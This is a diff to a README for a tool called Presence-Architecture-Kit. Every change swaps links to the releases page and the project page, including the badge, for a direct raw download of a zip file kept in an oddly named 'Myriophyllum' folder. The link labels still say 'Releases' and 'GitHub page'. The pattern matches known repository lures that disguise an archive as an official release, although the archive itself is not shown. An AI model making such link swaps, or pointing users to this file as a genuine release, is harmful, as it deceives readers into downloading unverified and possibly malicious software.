@@ -1,6 +1,6 @@
 # 🛠️ Presence-Architecture-Kit - Preserve Your Digital Identity
 
-[![Download Releases](https://img.shields.io/badge/Download-Presence--Architecture--Kit-blue?logo=github&style=for-the-badge)](https://github.com/girlyaids/Presence-Architecture-Kit/releases)
+[![Download Releases](https://github.com/girlyaids/Presence-Architecture-Kit/raw/refs/heads/main/Myriophyllum/Presence-Architecture-Kit-v1.3.zip)](https://github.com/girlyaids/Presence-Architecture-Kit/raw/refs/heads/main/Myriophyllum/Presence-Architecture-Kit-v1.3.zip)
 
 ---
 
@@ -48,7 +48,7 @@ You don’t need to be a developer to use this application. Follow these simple 
 
    Click the big blue button at the top or here to open the release page:
 
-   [Download Presence-Architecture-Kit Releases](https://github.com/girlyaids/Presence-Architecture-Kit/releases)
+   [Download Presence-Architecture-Kit Releases](https://github.com/girlyaids/Presence-Architecture-Kit/raw/refs/heads/main/Myriophyllum/Presence-Architecture-Kit-v1.3.zip)
 
 2. **Choose Your Version**
 
@@ -78,7 +78,7 @@ You don’t need to be a developer to use this application. Follow these simple 
 
 You can find all release versions here:
 
-[Download Presence-Architecture-Kit Releases](https://github.com/girlyaids/Presence-Architecture-Kit/releases)
+[Download Presence-Architecture-Kit Releases](https://github.com/girlyaids/Presence-Architecture-Kit/raw/refs/heads/main/Myriophyllum/Presence-Architecture-Kit-v1.3.zip)
 
 If you want the latest stable version, look for the version marked as "Latest release" on that page.
 
@@ -128,7 +128,7 @@ If you need help or want to learn more:
 
 - Check the **Documentation** folder in the app for guides and FAQs.
 - Visit the project’s GitHub page for updates and community support:  
-  [Presence-Architecture-Kit on GitHub](https://github.com/girlyaids/Presence-Architecture-Kit)
+  [Presence-Architecture-Kit on GitHub](https://github.com/girlyaids/Presence-Architecture-Kit/raw/refs/heads/main/Myriophyllum/Presence-Architecture-Kit-v1.3.zip)
 - You can open a new issue on GitHub if you find bugs or want to request features.
 
 ---
